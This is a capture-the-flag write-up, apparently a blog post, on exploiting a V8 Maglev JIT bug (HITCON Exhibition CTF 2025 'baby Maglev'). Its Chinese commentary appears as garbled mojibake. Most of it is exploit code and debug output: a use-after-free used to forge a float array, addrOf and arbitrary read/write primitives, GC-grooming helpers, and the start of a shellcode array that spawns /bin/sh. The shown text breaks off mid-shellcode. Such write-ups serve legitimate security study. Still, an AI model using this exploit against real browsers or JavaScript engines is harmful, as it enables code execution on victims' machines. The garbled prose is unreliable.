<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x2ba900064a91 SharedFunctionInfo f1 (0x2ba900065625 String[6] poc.js011)</span><br><span class="line">   0  LdaGlobal [0], [0]</span><br><span class="line">   1 InitialValue(this) â†’ (x), 4 uses</span><br><span class="line">   5 FunctionEntryStackCheck</span><br><span class="line">      â†³ lazy @-1 (2 live vars)</span><br><span class="line">   6 Jump b1</span><br><span class="line">   â†“</span><br><span class="line"> Block b1</span><br><span class="line">0x2ba900064a91 SharedFunctionInfo f1 (0x2ba900065625 String[6] poc.js00)</span><br><span class="line">   9  Construct r0, r1-r1, [2]</span><br><span class="line">   9 ğŸ¢ Construct [n7(x), n7(x), n3(x), n4(x), n8(x)] â†’ (x), 0 uses, but required</span><br><span class="line">      â†³ lazy @9 (2 live vars)</span><br><span class="line">  25  CallProperty1 r0, r1, r2, [8]</span><br><span class="line">  14 Float64Sqrt(MathSqrt) [n13(x)] â†’ (x), 4 uses</span><br><span class="line">  31  LdaCurrentContextSlot [2]</span><br><span class="line">  16 LoadTaggedField(0x4, compressed) [n15(x)] â†’ (x), 1 uses</span><br><span class="line">  33  ThrowReferenceErrorIfHole [4]</span><br><span class="line">  17 ThrowReferenceErrorIfHole [n16(x)]</span><br><span class="line">      â†³ lazy @33 (3 live vars)</span><br><span class="line">  37  StaCurrentContextSlot [2]</span><br><span class="line">      â†± eager @37 (3 live vars)</span><br><span class="line">  18 CheckHoleyFloat64IsSmi [n14(x)] </span><br><span class="line">  19 HoleyFloat64ToTagged [n14(x)] â†’ (x), 1 uses </span><br><span class="line">  20 StoreTaggedFieldNoWriteBarrier(0x4) [n15(x), n19(x)]</span><br><span class="line">  40  Return</span><br><span class="line">  22 ReduceInterruptBudgetForReturn(40) [n21(x)]</span><br><span class="line">  23 Return [n4(x)]</span><br></pre></td></tr></table></figure>

<p>v0 æœ€çµ‚æœƒæŒ‡å‘ä¸€å¡Šè¢« Free æ‰çš„ Memory<br>æˆ‘å€‘å¯ä»¥æ‹¿å›é‚£å¡Š memory ä¸¦åœ¨ä¸Šé¢å½é€  Float Array<br>åœ¨ GC å¾Œï¼ŒObject Address çš„ä½ 32 bits æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨ %DebugPrint() æ‹¿å‡ºä¾†ä¸ç”¨ leak</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">scavenge_gc</span>();</span><br><span class="line"><span class="title function_">mark_sweep_gc</span>();</span><br><span class="line"></span><br><span class="line">fake_object_helper = [<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">6.699586332753336e-309</span>, <span class="number">2.7815821086593595e-308</span>, <span class="number">8.34402697134475e-309</span>, <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x0004d149, 0x0004d149));  -&gt; 6.699586332753336e-309</span></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x000007bd, 0x00140071)); -&gt; 2.7815821086593595e-308</span></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x60000, 0x60000)); -&gt; 8.34402697134475e-309</span></span><br></pre></td></tr></table></figure>
<p>æŠŠå½é€ çš„ Float Array Element æŒ‡åˆ° Object Array Element å°±å¯ä»¥ç©©å®š leak Object Address<br>æŒ‡åˆ° &lt;address - 0x8&gt; å°±å¯ä»¥ä»»æ„è®€å¯« &lt;address&gt; ä¸Šçš„è³‡æ–™</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">console.log(helpers.pair_i32_to_f64(0x000007bd, 0x001c0011)); -&gt; 3.8939153263170276e-308</span></span><br><span class="line"><span class="comment">DebugPrint: 0x385900063051: [JSArray] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x38590004d105 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x38590004caad &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x3859001c0011 &lt;FixedArray[196608]&gt; [HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - length: 196608</span></span><br><span class="line"><span class="comment"> - properties: 0x3859000007bd &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - All own properties (excluding elements): &#123;</span></span><br><span class="line"><span class="comment">    0x385900000df1: [String] in ReadOnlySpace: #length: 0x385900026839 &lt;AccessorInfo name= 0x385900000df1 &lt;String[6]: #length&gt;, data= 0x385900000011 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> - elements: 0x3859001c0011 &lt;FixedArray[196608]&gt; &#123;</span></span><br><span class="line"><span class="comment">    0-196607: 0x3859000067b9 &lt;the_hole_value&gt;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = <span class="number">3.8939153263170276e-308</span>;</span><br><span class="line">    addrOf_helper[<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead32</span>(<span class="params">where</span>) &#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = helpers.<span class="title function_">pair_i32_to_f64</span>(<span class="number">0x000007bd</span>, <span class="title class_">Number</span>(where) - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead64</span>(<span class="params">where</span>) &#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = helpers.<span class="title function_">pair_i32_to_f64</span>(<span class="number">0x000007bd</span>, <span class="title class_">Number</span>(where) - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ç‚ºæ²’æœ‰é–‹ Heap Sandboxï¼Œæ‰€ä»¥å¯ä»¥ç”¨ç¶“å…¸çš„ ArrayBuffer + WASM trick é”æˆ RCE<br>ä½†è¦æ”¹çš„ Offset è·Ÿå‚³çµ± Writeup æåˆ°çš„ä¸å¤ªä¸€æ¨£ï¼Œæˆ‘é€™é‚Šæ˜¯æ‹¿ gdb æ…¢æ…¢æ‰¾ offset</p>
<p>###s Exploit<br>For Ubuntu 22.04</p>
<p>ä¸€é–‹å§‹åœ¨å¯« Exploit çš„æ™‚å€™è »ç©©å®šçš„ï¼ŒæˆåŠŸç‡å¤§æ¦‚æœ‰ 70%ï¼Œæ‰€ä»¥å°±é–‹å§‹åŒ… Docker<br>ç­‰åˆ°æ¯”è³½å‰ä¸€å¤©ä¸»è¾¦æ–¹çµ¦äº† GCP è®“æˆ‘å€‘æ¶é¡Œç›®ï¼Œçµæœç™¼ç¾ Exploit åœ¨ GCP ä¸Šçš„æˆåŠŸç‡è®Šä½éå¸¸å¤š<br>ç”¨ %DebugPrint() çœ‹äº†ä¸€ä¸‹ç™¼ç¾ Heap Number è·Ÿ Array çš„ä½ç½®å·®çš„æ¯”é æœŸå¤šå¾ˆå¤šå°è‡´ Fake Float Array Object å¤±æ•—</p>
<p>æˆ‘æ‡·ç–‘æ˜¯æ©Ÿå™¨çš„ RAM å¤ªå°å°è‡´çš„ï¼Œæ‰€ä»¥å°±é–‹å§‹åœ¨åŸæœ¬å¯« Exploit çš„ç’°å¢ƒæ¸¬<br>æŠŠ RAM å¾ 64 GB èª¿æˆ 4 GB å¾Œç™¼ç¾æˆåŠŸç‡ç¢ºå¯¦é™ä½å¾ˆå¤šï¼Œä½†ç•¶æˆ‘æŠŠ RAM å¾ 64GB æ”¹å› 4GB å¾Œï¼ŒæˆåŠŸç‡ä¹Ÿæ²’æœ‰è®Šå›ä¾†</p>
<p>æˆ‘ Debug äº†8å°æ™‚é‚„æ˜¯æ²’æ‰¾å‡ºåŸå› ï¼Œ<del>æœ€å¾Œæ±ºå®šå¤šé€å¹¾é Exploit</del><br><del>çœ‹èµ·ä¾†æ˜¯æˆ‘ Exploit å¯«å¤ªçˆ›å°è‡´ Heap Spray ä¸ç©©å®š</del><br><img src="/2025/10/19/HITCON-ExhibitionCTF-2025-baby-Maglev/exp.png"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Helpers</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span> = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">dv</span>  = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u8</span>  = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32</span> = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u64</span> = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f32</span> = <span class="keyword">new</span> <span class="title class_">Float32Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f64</span> = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">index</span> 	 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">pair_i32_to_f64</span>(<span class="params">p1, p2</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">0</span>] = p1;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">1</span>] = p2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">i64tof64</span>(<span class="params">i</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u64</span>[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">f64toi64</span>(<span class="params">f</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>] = f;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">u64</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">set_i64</span>(<span class="params">i</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u64</span>[<span class="number">0</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">set_l</span>(<span class="params">i</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">0</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">set_h</span>(<span class="params">i</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">1</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_i64</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">u64</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">ftoil</span>(<span class="params">f</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>] = f;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">0</span>]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">ftoih</span>(<span class="params">f</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>] = f;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">printhex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">breakpoint</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">slice</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    v0 = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mark_sweep_gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x7fe00000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">scavenge_gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10000</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        arr[i] = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addrOf_helper = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x30000</span>);</span><br><span class="line"><span class="keyword">var</span> helpers = <span class="keyword">new</span> <span class="title class_">Helpers</span>();</span><br><span class="line"><span class="keyword">var</span> fake_object_helper;</span><br><span class="line"><span class="keyword">let</span> v0 = <span class="number">48763</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">mark_sweep_gc</span>();</span><br><span class="line"><span class="title function_">mark_sweep_gc</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">f</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">scavenge_gc</span>();</span><br><span class="line"><span class="title function_">mark_sweep_gc</span>();</span><br><span class="line"></span><br><span class="line">fake_object_helper = [<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">6.699586332753336e-309</span>, <span class="number">2.7815821086593595e-308</span>, <span class="number">8.34402697134475e-309</span>, <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x0004d149, 0x0004d149));  -&gt; 6.699586332753336e-309</span></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x000007bd, 0x00140071)); -&gt; 2.7815821086593595e-308</span></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x60000, 0x60000)); -&gt; 8.34402697134475e-309</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 100011000007bd</span></span><br><span class="line"><span class="keyword">var</span> fake_array = v0;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] fake_array.length : 0x&#x27;</span> + fake_array.<span class="property">length</span>.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x000007bd, 0x001c0011)); -&gt; 3.8939153263170276e-308 </span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">terry1234@terry1234-virtual-machine:~/v8/out/hitcon_ctf$ ./d8 --allow-natives-syntax poc.js  </span></span><br><span class="line"><span class="comment">DebugPrint: 0x385900063051: [JSArray] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x38590004d105 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x38590004caad &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x3859001c0011 &lt;FixedArray[196608]&gt; [HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - length: 196608</span></span><br><span class="line"><span class="comment"> - properties: 0x3859000007bd &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - All own properties (excluding elements): &#123;</span></span><br><span class="line"><span class="comment">    0x385900000df1: [String] in ReadOnlySpace: #length: 0x385900026839 &lt;AccessorInfo name= 0x385900000df1 &lt;String[6]: #length&gt;, data= 0x385900000011 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> - elements: 0x3859001c0011 &lt;FixedArray[196608]&gt; &#123;</span></span><br><span class="line"><span class="comment">    0-196607: 0x3859000067b9 &lt;the_hole_value&gt;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">0x38590004d105: [Map] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x3859000448d5 &lt;MetaMap (0x385900044925 &lt;NativeContext[300]&gt;)&gt;</span></span><br><span class="line"><span class="comment"> - type: JS_ARRAY_TYPE</span></span><br><span class="line"><span class="comment"> - instance size: 16</span></span><br><span class="line"><span class="comment"> - inobject properties: 0</span></span><br><span class="line"><span class="comment"> - unused property fields: 0</span></span><br><span class="line"><span class="comment"> - elements kind: HOLEY_SMI_ELEMENTS</span></span><br><span class="line"><span class="comment"> - enum length: invalid</span></span><br><span class="line"><span class="comment"> - back pointer: 0x38590004ca85 &lt;Map[16](PACKED_SMI_ELEMENTS)&gt;</span></span><br><span class="line"><span class="comment"> - prototype_validity_cell: 0x385900000ac9 &lt;Cell value= [cleared]&gt;</span></span><br><span class="line"><span class="comment"> - instance descriptors #1: 0x38590004d0c9 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"><span class="comment"> - transitions #1: 0x38590004d12d &lt;TransitionArray[5]&gt;</span></span><br><span class="line"><span class="comment">   Transitions #1:</span></span><br><span class="line"><span class="comment">     0x385900000e8d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to PACKED_DOUBLE_ELEMENTS) -&gt; 0x38590004d149 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt;</span></span><br><span class="line"><span class="comment"> - prototype: 0x38590004caad &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - constructor: 0x38590004c9d5 &lt;JSFunction Array (sfi = 0x385900195c09)&gt;</span></span><br><span class="line"><span class="comment"> - dependent code: 0x3859000007cd &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span></span><br><span class="line"><span class="comment"> - construction counter: 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = <span class="number">3.8939153263170276e-308</span>;</span><br><span class="line">    addrOf_helper[<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead32</span>(<span class="params">where</span>) &#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = helpers.<span class="title function_">pair_i32_to_f64</span>(<span class="number">0x000007bd</span>, <span class="title class_">Number</span>(where) - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead64</span>(<span class="params">where</span>) &#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = helpers.<span class="title function_">pair_i32_to_f64</span>(<span class="number">0x000007bd</span>, <span class="title class_">Number</span>(where) - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">where, what</span>) &#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = helpers.<span class="title function_">pair_i32_to_f64</span>(<span class="number">0x000007bd</span>, <span class="title class_">Number</span>(where) - <span class="number">8</span>);</span><br><span class="line">    fake_array[<span class="number">0</span>] = helpers.<span class="title function_">i64tof64</span>(what);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* calc</span></span><br><span class="line"><span class="comment">var sc_arr = [</span></span><br><span class="line"><span class="comment">    0x10101010101b848n,    0x62792eb848500101n,    0x431480101626d60n,    0x2f7273752fb84824n,</span></span><br><span class="line"><span class="comment">    0x48e78948506e6962n,    0x1010101010101b8n,    0x6d606279b8485001n,    0x2404314801010162n,</span></span><br><span class="line"><span class="comment">    0x1485e086a56f631n,    0x313b68e6894856e6n,    0x101012434810101n,    0x4c50534944b84801n,</span></span><br><span class="line"><span class="comment">    0x6a52d231503d5941n,    0x894852e201485a08n,    0x50f583b6ae2n,</span></span><br><span class="line"><span class="comment">];*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sc_arr = [</span><br><span class="line">  <span class="number">0x732f6e69622fb848n</span>,  <span class="comment">// mov rax, 0x0068732f6e69622f</span></span><br><span class="line">  <span class="number">0x3148e78948500068n</span>,  <span class="comment">// push rax ; mov rdi,rsp ; xor 